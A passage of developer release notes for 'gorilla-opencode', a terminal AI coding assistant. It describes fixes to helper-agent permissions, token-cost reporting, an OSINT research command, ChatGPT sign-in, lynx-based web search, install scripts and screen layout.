to ask. So the other nine asked again. Now one approval covers the whole run.
And if you would rather not be asked at all, the new **`/yolo`** command (or
`/goal <your task>`) approves everything for the current conversation and runs
unattended — with a red warning in the status bar the whole time, so you cannot
forget it is on.

It could **wait forever**. If a permission question never got answered, the
helper waiting on it hung — silently, while the screen cheerfully reported it as
running. Three helpers sat like that for sixteen minutes doing nothing. There is
now a time limit, and killing a helper releases it immediately.

And it was **under-reporting what you spent by a factor of twenty**. Eight
helpers burned 280,744 tokens; the counter said 13,300 and the cost said $0.00.
Helper usage was never added up at all, and on a free plan the cost is always
zero however much you burn — so the one number that could have warned you was
incapable of changing. Now the tokens are counted, and the warning screen before
an expensive run tells you the real size: **about 2.9 million tokens per hour**
for a full ten-helper supervised run, measured from an actual run rather than
guessed. Because "$0.03 a minute" is true and sounds reassuring, and most people
will not do the multiplication.

Two more, found by using it rather than testing it. A run that burned 507,935
tokens across seventeen helpers reported **44,688** in the status bar and $0.00 —
helper usage was never counted, and on a free plan the cost reads zero however
much you burn. The number now counts the whole run, worked out when displayed
rather than stored, so it is right for past runs too: on the developer's own
machine the same conversation went from **58,551 to 851,996**. And your research
now **survives the write-up failing** — every helper's graded report is saved to
a file by the program the moment the run ends, before the AI is asked to do
anything with it. That mattered the same night: a two-hour investigation that
verified three claims by hand announced "writing the dossier now" and wrote
nothing, because assembling the answer is the most memory-hungry moment of a run
and it had none left. The findings were never lost — they just had nowhere to go.

Also: the serious research command is now called **OSINT All-Source Intelligence
Analysis**, which is the correct name for what it does — combining many
different kinds of source and weighing them against each other. It now follows
the UK government's published standard for intelligence assessment, which
attacks the characteristic weakness of an AI answer: everything sounding equally
certain. Likelihood is stated in seven fixed words with no invented percentages,
and how solid the basis is gets rated separately, so "highly likely, but on a
weak basis" is something the tool can now actually say. Every line is marked as
fact, inference or assumption. Credited to its authors under their open licence.

Two commands existed but could not be typed: **`/compact`** (shorten a long
conversation so it keeps working — vital on the small free models) and
**`/init`**. Both worked; both answered "Unknown command". Fixed, with a test so
it cannot happen a fourth time. arXiv, bioRxiv and medRxiv were added to the map
of sources the helpers carry. And when helpers are working, the program now says
so every ninety seconds, because on a slow model over a slow connection a
working program and a crashed one look identical — one lane went quiet for 23
minutes and came back with 19,118 tokens of real work.

**One important limit:** installing a new version does not change a copy that is
already running. Quit and restart the program, or you will be testing yesterday's
build.

**Technical:** Spinner tick chain now bounded to when it is drawn (`Init` no
longer starts it; declining to forward a `TickMsg` lets it lapse). Permission
grants resolve to the root of the session tree via `RegisterChildSession`,
called by both the research and sub-agent tools; scope is unchanged (tool,
action and path still match exactly, and grants cannot cross conversations —
both pinned by tests). `permission.Request` gains a bounded wait
(`PermissionWait`, 10m) which denies and logs on expiry, and `CancelSession`
releases waiters scoped to one conversation when a helper is killed —
cancelling ctx was insufficient because a goroutine parked on a channel does not
watch it. `helperSpend` carries cost plus prompt and completion tokens together
and rolls all three into the parent session, with the `if total > 0` guard
removed (on free tiers cost is always 0.00). The `/osint` gate renders full
width and states run size in tokens/hour from a measured 21,596 tok/min across 8
helpers. `doctrine=dossier` prompts carry the PHIA Probability Yardstick and
Analytical Confidence Rating verbatim, kept as separate axes, plus
fact/inference/assumption labelling and falsifiable alternatives. `/yolo`
(`/auto`, `/autopilot`, `/goal`) toggles `AutoApproveSession` for the
conversation, never persisted. `/compact` and `/init` joined the typed dispatch;
`TestEveryPaletteCommandIsAlsoTypeable` fails if a palette entry is not typeable
and documented. Dialog frames may no longer exceed the terminal in either
dimension (`dialogWidth` caps rather than floors); `internal/llm/agent` gained
`configtest.Isolate` after its tests wrote to the developer's real
`loadout.json`. 26 test packages green.

## v0.1.89 — 2026-08-17 — no window draws outside the window

Full dual-track document: [v0.1.89-release-notes.md](v0.1.89-release-notes.md).

**Plain-language version:** A menu wider than your terminal is not just untidy.
The program redraws its screen by rubbing out the last one, and it counts how much
to rub out in lines it WROTE rather than rows your terminal USED. A line too wide
to fit takes two rows on screen while counting as one, so every redraw leaves a row
behind, and the leftovers pile up in your scrollback where nothing can clear them.
Three screens had exactly that fault: `/context` asked for 106 columns no matter
how wide your terminal really was, and the two `/osint` screens did the same at 80
and 70 columns. The `/osint` warning screen also asked for 37 rows on a 24-row
terminal, so the top of it scrolled away. Now every screen fits inside the terminal
it is drawn into, long lines are cut with an "…" rather than spilling out, and the
warning screen gives up its explanations in stages when space is short — but never
the part that matters: what the run costs, the controls, and the keys. If you use a
maximised window you probably never saw any of this; it bites on narrow windows,
split panes, and phone or tablet sessions. Nothing else changed — the search tool,
`/osint` and the 985-source catalogue are all as they were in v0.1.88.

**Technical:** `loadoutDialogCmp.width()` floored the content width UP to
`loadoutMinWidth` (100) and the render then added 6 columns of chrome, producing a
106-column frame at any terminal size; both `/osint` screens repeated the shape as
`min(110, max(80, w-8))` and `min(104, max(70, w-6))`. New
`dialogWidth(termWidth, preferred, chrome)` subtracts chrome from the terminal and
treats the preferred width as a CAP, with a 20-column absolute floor.
`OsintDialogCmp.View()` gains the progressive-shedding pattern from `/help`: four
leanness tiers measured with `lipgloss.Height`, dropping prose while always keeping
the warning, the cost lines, the helper/mode controls and the key hints. Loadout
headlines and hints now pass through `fitLine`, since a `.Width(w)` style wraps
rather than overflowing and each wrap cost a row where there were none to spare —
the `knownSmallOverflow` ratchet duly moved `/context` from 19 to 18 at 60x10 and
40x8. Both `/osint` screens joined `sizedDialogs`, entering the ratchet with
measured figures. The existing `TestNoDialogOverflowsTheWidth` could not have
caught any of this: it renders through `screentest`, whose grid clips over-wide
lines exactly as a terminal does, so `WidestRow()` can never exceed the terminal
width — the new `frame_fits_test.go` measures `lipgloss.Width` on the string before
it reaches a grid, and is proven non-vacuous against the restored floor. Binary
52,125,988 -> 52,134,180 bytes stripped (+8,192). 26 test packages green.

## v0.1.88 — 2026-08-17 — one search tool, and research that cites its sources

Full dual-track document: [v0.1.88-release-notes.md](v0.1.88-release-notes.md).

**Plain-language version:** Two things changed that you will actually feel. First,
the three separate tools the AI used to look through your files — one to list, one
to match filenames, one to search inside them — are now a single tool that does the
whole job in one go and hands back the matching lines with the lines around them.
That sounds like tidying up, and it is not: the old way of answering "where is this
handled?" cost about 1,845 tokens across two turns, and roughly ten thousand more
when the search failed and everything had to restart. The new way costs 132 tokens,
once. Tokens are what you are billed in, so this is money, every message, for as
long as you use the program. The description that rides along on every single
message got smaller too, from 1,388 tokens to 1,279. And because search results are
now capped by SIZE rather than by "number of results", a single search can no longer
dump two megabytes into your conversation the way one once did — that incident took
a conversation from 15.9K tokens to 675K in one turn.

Second, there is a new command, `/osint`, and it is the serious one. It does not
answer from memory; it investigates. It breaks your question into smaller ones,
sends four to ten helpers to work through a catalogue of **985 real sources** — 866
of them free, 370 needing no account at all — grades every claim it finds on two
separate scales (how much the source can be trusted, and how well that specific
claim is confirmed), notices when ten news sites are all repeating one press release
rather than confirming each other, then goes back once for whatever it missed, and
finally tells you plainly what it could **not** find out. The finished dossier is
saved as a file outside your working folder, on purpose: working folders are often
git repositories, and a private question should never end up in a public commit.
It costs real money — every helper is a full AI session — so it ships switched OFF,
you arm it yourself in `/context`, and before every single run a red screen shows
you the burn rate in your own money for your own model. After that it is your call.
Type `/osint` on its own to read the whole explanation first. The everyday
`/research` command is unchanged and much cheaper.

Also: `/context` now says **ON** or **OFF** in words that visibly flip when you press
space, after a user reported he genuinely could not tell what was switched on —
the old screen showed a checkbox and then opened every description with the word
"off", whatever the state. The list is alphabetical now too. Web search stops
claiming abilities it does not have when nothing is configured. Four new free
sources were added (world news, World Bank, humanitarian data, US corporate
filings). And four new documents ship inside the package, including a list of all
985 sources, so "hundreds of sources" is something you can check rather than
something you have to believe.

Honest limits: the download grows by 252 KiB; a tester on Arch/CachyOS reported
leftover lines on screen that could not be reproduced here and is **not** fixed in
this release; and the `/osint` cost forecast rests on three assumptions that are
printed on the warning screen so you can argue with them.

**Technical:** `find` (pfind 3.2.0, `go:embed`ed and hash-verified on extraction)
replaces `ls`/`glob`/`grep`, which are quarantined as `.go.retired`; results are
byte-capped at 32 KB and announce truncation. New `/osint` command with its own
gate dialog and full-screen capability page, gated on the `tool.dossier` loadout
row (ships off, red); `doctrine=dossier` appears in the research tool's schema only
while armed and is refused at Run when not, switching helpers to two-axis Admiralty
grading (A–F × 1–6), ultimate-origin circular-report tracing and query hygiene, with
a report footer imposing ONE bounded gap round, the product format, and a write path
under the user's own home directory (`config.DossierDir()`, resolved at runtime — no
machine-specific path is compiled in). Source registry reconciled against the three
curated lists: 160 unmatched names classified as 52 headings, 23 variant spellings
and 85 genuinely missing sources, which were added (900 → 985); `docs/OSINT-SOURCE-CATALOG.md`
is generated from that registry, never hand-edited. Four keyless backends: GDELT,
World Bank WDS, HDX (replacing ReliefWeb's appname-gated API after a coverage
analysis) and SEC EDGAR full-text. `/context` rows sort at display time with the
toggle resolving through the same sorted view. `FlexInt` accepts losslessly
convertible string/float integers. `build-deb.sh` and `build-arch.sh` now refuse a
binary whose `--version` stamp disagrees with the requested version — added after
the packager silently wrapped a stale `~test8` binary as `~test9` and `~test10`.
Binary 51,867,940 → 52,125,988 bytes stripped (+252 KiB). 26 test packages green.

## v0.1.87 — 2026-08-17 — sign in with ChatGPT (a free account is enough)

Full dual-track document: [v0.1.87-release-notes.md](v0.1.87-release-notes.md).

**Plain-language version:** You can now use OpenAI's models with the ChatGPT
account you already have, instead of an API key — and a **free** ChatGPT account
works. That matters because an API key needs a developer account, which needs a
payment method, which needs a credit card, and for a lot of people that is where
the road ends. You sign in through your browser the way you sign in to any
website; ChatGPT is the second row on the start-up screen, tagged free. There is
no per-use charge on this route at all, which is why those two models show no
prices — showing API prices next to models that never charge you would be a lie.
Go over your plan's allowance and you are paused for a while, never billed. You
get GPT-5.5 for your work and a smaller model the program uses quietly in the
background for jobs like naming your conversations, so it does not spend the
strong model on a chat title and bring your cooldown forward for nothing. The two
newest models, GPT-5.6 Terra and Luna, are deliberately **not** offered: they
expect tools handed over in a shape this program does not speak yet, so listing
them would mean you sign in, pick one, and watch it fail the first time it tries
to read a file. The sign-in screen says so on the row itself. Honest limits, all
stated on screen or in the notes: this rides an interface OpenAI does not
publish, so it could break without warning; the smaller model is retired by
OpenAI on 31 August 2026; there is no usage meter yet; and the model list is a
snapshot that does not refresh itself.

**Technical:** New provider `chatgpt` — OAuth 2.0 + PKCE (S256) against
auth.openai.com, credentials at `~/.config/gorilla-opencode/chatgpt-oauth.json`
(0600, its own file so the three sign-ins cannot clobber each other), loopback
callback fixed at port 1455 because OpenAI matches `redirect_uri` exactly and a
kernel-chosen port fails at authorize. `internal/llm/provider/chatgpt.go` is a
hand-built Responses API transport, **not** `OpenAIClient` behind a base URL the
way GROQ/xAI/DeepSeek are: the token does not authenticate against
api.openai.com at all, and the backend uses `instructions`/`input`, top-level
`function_call`/`function_call_output` items, flat tool objects and named
`response.*` SSE events. `send()` drains `stream()` so there is no second parse
to rot. Two of five advertised models registered; `gpt-5.6-terra`/`-luna` report
`tool_mode: code_mode_only` and are withheld, `codex-auto-review` is
`visibility: hide`. Catalogue costs are 0 by design. `backgroundModelByProvider`
routes helpers to `gpt-5.4-mini` — one pool, so this is cheapness, not
Antigravity's separate-quota split. Two live-measured corrections to inferred
wire shape: this backend **rejects** `max_output_tokens` (400 Unsupported
parameter, where the public Responses API accepts it), and `client_version` is a
required *query* parameter on `/responses`, not a header. `provider.ProviderModel`
/`NewProviderModel` exported so the portal renders headlessly; the row tests were
confirmed to FAIL with the row deleted. Live probes gated behind `CHATGPT_LIVE=1`
read past this package's config isolation for the credential only. Stripped
binary 51,867,940 B, +77,824 B (+0.15%) over v0.1.86. Also folded in: `install.sh`
fetch-then-parse, so a SIGPIPE from `curl | awk` is no longer misreported as a
network failure.

## v0.1.86 — 2026-08-16 — the repairs v0.1.85 needed, and history that knows which folder it came from

Full dual-track document: [v0.1.86-release-notes.md](v0.1.86-release-notes.md).

**Plain-language version:** The one-line install has never worked in any
release — it asked the download page for a file this project has never
published, so anyone who tried it got an error. That file now exists (a plain
`.tar.gz`, which also gives Fedora, openSUSE, Alpine and anyone without sudo a
way in for the first time), and the script that fetches it was rewritten: it
used to install the binary under the wrong name, check the version of a
*different* program, and treat a "file not found" web page as if it were the
download. Your conversation history now knows which folder it belongs to, so
opening the tool in your kernel folder shows your kernel conversations instead
of all of them at once — `ctrl+a` shows everything when you want to search
across projects. This adds no new files or folders anywhere; it is one column
in the database you already have. The startup screen now shouts in red capitals
when your model list has gone stale, and checks weekly instead of monthly,
because the lists rot in about a week and a monthly warning arrives after you
have already hit a dead model. Also fixed: the Arch instructions told you to
download this version and install the previous one, both packages shipped every
release's notes *except* their own, the settings screen claimed your data lives
"inside your project" when it has been machine-wide since v0.1.85, our docs
named `OPENCODE_…` options the program stopped reading, file search was walking
into abandoned conversation folders, and the published settings reference
contained the build machine's username.

**Technical:** `sessions` gains `started_in` (migration
`20260816230000`), stamped from `config.WorkingDirectory()` at create and
filtered by `ListSessionsByDir`, which also returns rows with an empty value so
pre-column sessions can never become unfindable. The picker holds both lists and
toggles locally. Generated code was regenerated with sqlc v1.29.0 rather than
hand-edited across five files. `models.StaleAfter` 30d → 7d;
`staleModelsNotice` renders `#FF0000` bold capitals behind the lone constant
`staleModelsHeadline`. `config.TildeHome` rewrites `$HOME` to `~` and is shared
by the doc generator and `TestSettingsDocIsCurrent`, which previously disagreed
about how a path renders. `install` verifies the archive with `gzip -t` and
re-reads `--version` after installing. `fileutil.commonIgnoredDirs` regains
`.opencode`. First database tests in the project; `TestListSessionsByDirScopes`
was confirmed to FAIL with its `WHERE` clause removed.

---

## v0.1.85 — 2026-08-16 — the fork takes its own name, and the prompt stops hiding your words

Full dual-track document: [v0.1.85-release-notes.md](v0.1.85-release-notes.md).

**Plain-language version:** Two things. Typing a long sentence used to make the
start of it slide off the left edge of the screen and vanish — the words were
never lost, but you could not read back what you had written before sending it.
The box now grows downwards and keeps everything visible. Separately, this
program is a fork of another project called OpenCode, and it had inherited that
project's habit of naming everything it saved after *them* — so on a machine
running both, two different programs were writing folders with the same name.
During development that very nearly got this project's work thrown out with the
other one's leftovers. Everything is now named `gorilla-opencode` and lives in
the four standard Linux locations instead of dropping a folder into every
project you open. **Upgrading loses sight of your old conversations** — they are
safe, in the old folder, but this version does not read them and nothing on
screen says so. No migration exists.

**Technical:** `appName` → `gorilla-opencode`, `defaultDataDirectory` deleted,
`ConfigBase`/`DataBase`/`CacheBase`/`StateBase` added in `store.go`, env prefix
→ `GORILLA_OPENCODE`, database renamed, both legacy migrations removed as a
deliberate clean break. The wrapping defect was stale cached state, not layout:
`editor.go` measured its height against the live bubbles textarea whose viewport
was still one row, and bubbles caches its wrapped-line layout against the height
it was last configured with, so a one-row object answered "one row" regardless
of content. `measuredRows()` probes a copy at full buffer height and re-applies
the value to force a cache rebuild. Note the accompanying regression test is
vacuous with respect to that fix — it passes with the fix removed, because a
textarea built inside a test has no stale viewport to reuse.

---

## v0.1.84 — 2026-08-15 — quota warning messages now scream in bright red

Full dual-track document: [v0.1.84-release-notes.md](v0.1.84-release-notes.md).

**Plain-language version:** When your quota drops to a lower tier — say from
"halfway" to "running low" — the program prints a timestamped warning line in
the scrollback, like `10:27:38  quota · 🍌🍌 Running low on bananas... —
Claude and GPT models: 47% left`. That line was showing up in plain terminal
white, indistinguishable from any other output. It now appears bold and bright
red (`#FF0000`) — the same warning red established in v0.1.83 — so it is
impossible to miss. Both types of quota message are affected: the automatic
tier-crossing alerts that fire after each response, and the manual `/usage`
reading line at the top of the full panel.

**Technical:** `formatQuotaScrollbackLine` in `internal/tui/tui.go`
(modified 26-08-15-10-27) now wraps its output in
`lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF0000"))` before
handing the string to `tea.Println`. Both call sites — `quotaLineMsg` and
`quotaAlertMsg` — route through this function, so a single change covers both.
The prior commit (0787f7b) changed `WarningColor` in the theme struct, which
only reaches the footer status bar via `t.Warning()`; `tea.Println` bypasses
the theme entirely and requires the style to be applied to the string itself.

---

## v0.1.83 — 2026-08-15 — research tool painted bright red in /context

Full dual-track document: [v0.1.83-release-notes.md](v0.1.83-release-notes.md).

**Plain-language version:** The research tool row in the `/context` menu is
now bright red and bold. It was sitting in the list looking the same as every
other tool, which is wrong — turning it on and forgetting about it can silently
run several full AI sessions every time you ask a question. The red makes it
impossible to miss: you know it is there, you know it is on, and you know what
that means before you close the menu. Selecting it with the cursor still
highlights it in the normal way (inverted colours) so keyboard navigation is
unchanged.

**Technical:** `renderAt()` in `internal/tui/components/dialog/loadout.go` now
branches on `c.ID == "tool.research"` before applying `rowStyle`. When that row
is not cursor-selected it receives `lipgloss.Color("#FF0000")` foreground with
`Bold(true)` instead of the shared muted/normal style. The selected path falls
through to the existing `rowStyle` so selection highlight is unaffected.

---

## v0.1.82 — 2026-08-14 — it investigates, and it tells you what that costs

Full dual-track document: [v0.1.82-release-notes.md](v0.1.82-release-notes.md).
Where this goes next: [ROADMAP.md](../ROADMAP.md).

**Plain-language version:** There is a new `/research` command. Ask it a
question and it sends out up to ten helpers, each with a different job — one
searches your own machine first, one looks for people who already solved it,
one reads the official documents, one checks what the thing you are targeting
*actually* demands. They come back with evidence, and each claim says how it is
known, so a random forum comment cannot arrive dressed as a fact. You choose how
they run: one at a time, all at once, or all at once with a second agent
checking each one's homework. Before anything runs you are shown what it costs —
per minute, per hour, and for this run — and every one of those numbers can be
checked with a calculator, because several of them previously could not. One
version told you an hour of a billed model cost `$0`. That is fixed, along with
a double-counted prompt that had been inflating every price by about 28%.
`/tasks` now shows every helper, including the ones still waiting their turn,
each marked 🦍🟡 queued, 🦍🟢 running, 🦍🔵 done, 🦍🔴 failed or 🦍🛑 killed —
and you can kill one before it spends anything. Previously waiting helpers were
invisible *and* unkillable, so "kill 'em all" only made room for the next batch.
Finally, when you change the model you chat with, the background jobs follow you
— and a screen tells you exactly what moved, what it costs, what you gained, and
lets you put it all back with one key.

**Technical:** New `research` tool: 10 fixed roles with non-overlapping lanes,
four mandatory; enforced `ANSWER/FINDINGS/CONFIDENCE/NOT ESTABLISHED` contract
with evidence tiers; three modes sharing one scheduler (sequential is
concurrency of 1). `ResearchMaxInFlight` 4→11 so a full run never queues. Helpers
register *before* queueing with an explicit `SubAgentState`, each owning a
cancellable context, so a QUEUED helper is visible and killable — previously
registration happened after winning a semaphore slot, hiding six of ten helpers
from `/tasks`, the status count and the kill switch. `FollowCoderModel` now
always follows and returns `[]AgentModelMove`; `RevertAgentModels` restores each
agent to its own prior model. Tool dispatch strips one trailing `<|…|>` control
token then demands a plain identifier and an *exact* match against that agent's
own tool list — no prefix, no fuzzy, no fallback (30 of 44 calls in a measured
run failed as `Tool not found: ls<|message|>`); guarded by attack-shaped tests
plus AST checks that permission requests use tool constants. Cost screen: base
prompt was counted twice (`LoadoutActiveTokens` already includes it), supervised
session counts were `agents*2` where supervision skips peeking lanes (real: 8,
9, 11, 13, 15, 17, 18 for 4..10), `%.0f` on the hourly figure, and independent
rounding of rate vs total. Antigravity live model refresh (5→20 models).

**Not fixed, tracked in ROADMAP.md:** `esc` does not close `/tasks` while a
permission prompt is open — the permission dialog owns the keyboard but renders
*underneath*, so focus and z-order are inverted. DONE rows still vanish because
`runWave` unregisters on completion. `ResearchSecondsPerStep = 15.0` is an
assumption, labelled as one on screen, and every per-minute figure rests on it.

## v0.1.81 — 2026-08-12 — the picker answers questions; the gorilla speaks up

Full dual-track document: [v0.1.81-release-notes.md](v0.1.81-release-notes.md).

**Plain-language version:** The model picker learned three things. Press `/`
and type what you want — `free coding`, `advanced reasoning` — and it searches
every connected provider's names *and* descriptions at once. Press `tab` on
any model and you get its full page: the complete description, exact prices,
context window, capabilities, and which of YOUR keys pays for it ("billed to
your openrouter key sk-or-…#8f46" — a fingerprint that tells rotated keys
apart but can never reveal one). And the descriptions are finally whole:
OpenRouter's own API cuts every one off at ~215 characters, so the release
build now fetches each model's public page for the full text — 264 of 279
models complete, and the 15 that OpenRouter publishes nothing more for say
plainly: "sorry lads — not our fault: that is ALL OpenRouter provides as a
description for this model." Meanwhile the banana ladder grew to nine rungs
with escalating gorilla bulletins below 20%, and quota is re-checked after
each response — cross a rung mid-session and it is announced as it happens,
instead of burning half a week invisibly between `/usage` calls.

**Technical:** Search domain snapshots all enabled providers, terms AND over
name/description/detail/provider/id, `[connection]` tags on mixed lists, state
restored on esc. Detail page renders from the Model struct plus
`connectionFor()`; width and height both clamped. `config.ProviderKeyFingerprint`
= 6-char prefix + 2 bytes of SHA-256 + length, mutation-tested against leaks.
`Model.Detail` (cap 2400) filled by the generator from each model's public
page (the list API truncates server-side, measured 354/406); runtime refresh
never scrapes — `PreferFullerDetail` keeps the fuller bundled text, stripping
the baked-in apology before its prefix comparison. Catalogue cache schema
5→7; catalogue regenerated (279 models, prices refreshed, one retired). The
banana ladder is one `bananaTier` switch (8..0) shared by panel wording and
crossing alerts; post-response checks throttle to 30s, fail silent, and the
footer echo strips emoji (inline-frame width traps). Picker width now clamps
to the terminal — the old 62-column floor clipped narrow windows.

## v0.1.80 — 2026-08-11 — /usage draws a real meter, with bananas

Full dual-track document: [v0.1.80-release-notes.md](v0.1.80-release-notes.md).

**Plain-language version:** Checking your free weekly allowance used to print
one line — `Claude and GPT models: 96%` — and you had to guess whether that
meant 96% left or 96% spent. Now `/usage` draws a panel: a coloured bar per
model group, painted like a thermometer (red at the left, green at the right)
that shrinks from the green end as your week burns, both numbers spelled out
("75% left, 25% used · resets in 2d"), and bananas for the mood — three when
you are loaded, thinning as you run down, a gorilla when the barrel is empty.
If you pay for DeepSeek or OpenRouter, your balance shows in the same panel;
an OpenRouter key with no credits bought says exactly that instead of
pretending an empty wallet is an empty tank. A balance check that fails says
so, rather than quietly disappearing.

**Technical:** New `internal/quota` package (DeepSeek `/user/balance`,
OpenRouter `/api/v1/credits`; readings normalise to Text/Fraction/FreeTier/Err,
fraction −1 = no denominator, error bodies never echoed). Pure renderer in
`internal/tui/quota_panel.go`: fixed-scale gauge cells (hue = 120° × position),
banana thresholds ≥50 / ≥⅓ / ≥20 / >0 / 0, reflow wordwrap with hanging
indents, emoji confined to the scrollback panel (the footer is inline-frame).
Driving the real binary live caught what the fixtures could not: agy 1.1.11
renamed the bucket displayName, doubling the word "Remaining" — fixed, both
wire shapes in the fixture, regression test pinned. Live verification method
(GNU screen) recorded in CLAUDE.md.

## v0.1.79 — 2026-08-09 — lynx is now required, not suggested

Full dual-track document: [v0.1.79-release-notes.md](v0.1.79-release-notes.md).

**Plain-language version:** One fix, straight after v0.1.78. That release said
the package *recommends* lynx — the small text browser that makes web search work
with no setup. That sounded polite and was wrong. `apt` honours a recommendation;
**gdebi does not** — the graphical installer you get by right-clicking a `.deb`,
which is how most people who do not live in a terminal install software. Its
source never mentions the field, and `dpkg -i` resolves nothing at all. So the
two friendliest install routes would have skipped the package that makes the
headline feature work, and web search would have looked broken to exactly the
people it was built for. A promise that only holds when you install the expert
way is not a promise. It is 641 KB and now arrives on every path.

**Technical:** `Recommends: lynx` → `Depends: lynx`. Verified by reading gdebi's
source (no occurrence of "Recommends"). apt's default is
`APT::Install-Recommends "true"`, which is why the gap was invisible when tested
with apt alone — the one tool that honours the weaker field.

## v0.1.78 — 2026-08-09 — web search with no setup, and a model list that tells the truth

Full dual-track document: [v0.1.78-release-notes.md](v0.1.78-release-notes.md).

**Plain-language version:** Twenty changes. The three that matter:

**Web search now works out of the box.** Last release it needed you to run your
own search engine. Now it uses lynx — a text-only browser from 1992, 641 KB,
already in Debian — and needs no account, no key and no card. lynx is not bundled
in the download; it comes from Debian's repository like everything else on your
system, so Debian ships its security updates rather than us. The whole feature
costs about 13 KB. Install with `sudo apt install ./Compiled.Builds/...deb`, not
`dpkg -i`, because dpkg does not fetch what a package recommends.

**Every model now says what it costs and what it is good for.** Prices come
first — "FREE", "$0.04/$0.14 per 1M", "$2.5/$12.5 per 1M" — because free models
were marked and paid ones were not, so telling them apart meant knowing that
silence means paid, and 260 of 274 entries were silent. Then a plain verdict:
"shit tier for code — vendor calls it roleplay", "CAN CODE", or "UNTESTED for
coding work — use at your own risk". Where the label comes from the vendor's own
description the triggering word is quoted, so you can check it rather than trust
us. Where we have used a model and it caused damage we say so and cite where that
was recorded. Where nobody knows, it says so instead of guessing. This matters
because looking up an unfamiliar model name means a web search and a heavy vendor
page, which on a slow connection is not inconvenient but impossible.

**A personal shortlist.** Space bookmarks a model, `b` jumps to your list, space
again removes it. It spans every provider, so what you actually use sits in one
place instead of being hunted for among hundreds.

Also: the model list has ends (it used to wrap forever, so at 128 models you
could scroll past the top and lose your place); OpenRouter works again — nine of
its models had been retired by the provider, including the two used as defaults,
so setting it up produced something that could not answer at all; and
`gorilla-opencode models refresh` lets you update the list yourself without
waiting for a release.

**Technical:** lynx chosen on measurement — curl gets a 14 KB block page from
DuckDuckGo where lynx gets real results; the user agent is left honest because
spoofing Chrome converts a 157-byte exit-1 failure into a 1,122-byte exit-0
CAPTCHA page; success is counted in extracted result URLs, the only check that
survives every observed failure. Engine order measured (marginalia 43, brave 28,
ecosia 27, mojeek 19; duckduckgo and google 0 and permanently excluded).
OpenRouter's 400 published models become 274 after dropping 67 that cannot call
tools and 59 asynchronous batch endpoints. Descriptions are built in four
traceable layers — earned verdict with citation, curated judgement for the same
underlying model, vendor claim with the trigger quoted, or an admission that
nothing is known — and a test fails the build if any earned verdict lacks
evidence. The refresh cache carries a schema version so one built under older
rules is discarded rather than silently reverting a fix.

Prompt lines now carry `[[needs tool.x]]` and disappear with the tool they
describe; the worst case had been telling the model "never say you cannot reach a
page" while the fetch tool was switched off. The environment block lists
directories first and collapses version families, after ASCII sort let 13
release-notes files consume the whole 25-entry budget and the model was never
shown `cmd/`, `internal/` or `go.mod`. Built packages now go in
`Compiled.Builds/` rather than the repo root.

## v0.1.77 — 2026-08-09 — web search that needs no setup at all

Full dual-track document: [v0.1.77-release-notes.md](v0.1.77-release-notes.md).

**Plain-language version:** Two releases ago web search became possible, if you
ran your own search engine. Last release the assistant learned to offer to set
that up. Now it just works.

The assistant can search the web through **lynx**, a text-only browser that has
been around since 1992 and is 641 KB. No account, no API key, no card, no
background service, nothing to configure. If lynx is on your machine it is used
automatically; if not, the assistant offers to install it — about five seconds —
or to set up the fuller SearXNG option instead.

An honest note, because "built in" is a fair question: lynx is **not** bundled
inside the download. It comes from Debian's own repository, like everything else
on your system, so it gets security updates from Debian rather than from us. The
package simply says it would like lynx alongside it. The whole feature costs
about **13 KB** of download (plus 641 KB for lynx if you lack it) against a 19.2 MB
package — about 0.06%. Bundling SearXNG, a better version of the same feature,
would have added roughly 300 MB.

One thing worth knowing: search engines are not keen on being read by programs
and sometimes refuse. When that happens the assistant is told the search failed
and will say so, rather than answer from memory. A search that quietly returns
nothing is far more dangerous than one that admits failure, because "nothing
found" reads as "this does not exist".

**Technical:** `source: web` resolves SearXNG → lynx → refuse. Engine order is
measured, not assumed (marginalia 43, brave 28, ecosia 27, mojeek 19 external
result URLs; duckduckgo and google 0 and permanently excluded — Google refuses
text browsers outright). The user agent is left honest on purpose: spoofing
Chrome raises the hit rate but converts a 157-byte exit-1 failure into a
1,122-byte exit-0 CAPTCHA page, and a model handed that summarises the CAPTCHA.
Success is therefore measured as "did any external result URL come out", the only
check that survives every observed failure. The parser keys off lynx's own
`References` list and `[n]` markers rather than any engine's HTML.

Two bugs were found by running it, both producing plausible-looking output: every
title came out as "More on reddit.com", and — worse — a real title got attached
to the wrong URL when lynx wrapped a link label across two lines and the parser
searched forward into the next result. Fixed structurally: a marker with text
carries its own label and looking elsewhere is never allowed.

Also: the refusal now offers `sudo -n apt-get install -y lynx` first (with `-n`
so a password prompt fails fast instead of hanging the agent forever), and
release checklist step 6 moved from `dpkg -i` to `apt install ./file.deb` —
`dpkg` resolves neither Depends nor Recommends, so installing that way silently
skipped lynx.

Sizes: binary 51,073,316 → 51,089,700 (+16,384); .deb 19,208,080 → ~19,221,700
(~+13,600 — approximate because this changelog ships inside the package, so
stating the exact size changes it).

## v0.1.76 — 2026-08-09 — the assistant offers to set up web search, instead of explaining how

Full dual-track document: [v0.1.76-release-notes.md](v0.1.76-release-notes.md).

**Plain-language version:** Last release added web search, but only if you ran
your own copy of a search engine called SearXNG — which meant, realistically,
almost nobody had it.

Now the assistant offers. Ask it something it needs the web for and instead of
"web search is not configured, here are some instructions", it says it can set it
up for you: no account, no API key, no card, all on your own machine, a couple of
minutes. Say yes and it runs one installer. Say no and it asks you for a link, as
before.

The installer is a script we ship, not something the assistant improvises. That
matters more than it sounds. When we handed an earlier version of those setup
instructions to a model as plain text and asked it to pass them on, it quietly
dropped one word — `pyyaml` — from one line, and that single omission makes the
install fail with a confusing error. A model doing the installation itself would
make the same class of mistake and then tell you it had worked. So the
assistant's job is to ask you and run one command; every decision that could go
wrong is made once, in a script that does not improvise. The script also checks
its own work: it runs a real search and requires real results back before
reporting success.

**Technical:** `packaging/setup-searxng.sh` ships at
`/usr/share/gorilla-opencode/setup-searxng.sh`. It encodes both traps (`pip
install -e .` fails before msgspec/pyyaml exist; `json` is absent from
`search.formats` by default, which is why public instances 403), installs a
systemd user service, needs no root, writes `searxngURL` preserving every other
config key, and verifies with a live query — exiting non-zero naming the failed
step rather than reporting "probably fine".

Also fixes a test-isolation bug this exposed: `internal/llm/tools`' `TestMain`
called `config.Load` without redirecting `XDG_CONFIG_HOME`, so `config.Get()` had
been returning the developer's real config all along. Invisible until a config
value changed behaviour — when the installer wrote `searxngURL`, four stubbed
tests silently began querying the live instance and failed with "want 2 hits, got
8". Had it returned two, the suite would have stayed green while testing nothing.
`configtest` gains `IsolateWith(m, setup)` so the redirect precedes the load.

Adds an opt-in probe recording a negative result: Antigravity does **not** support
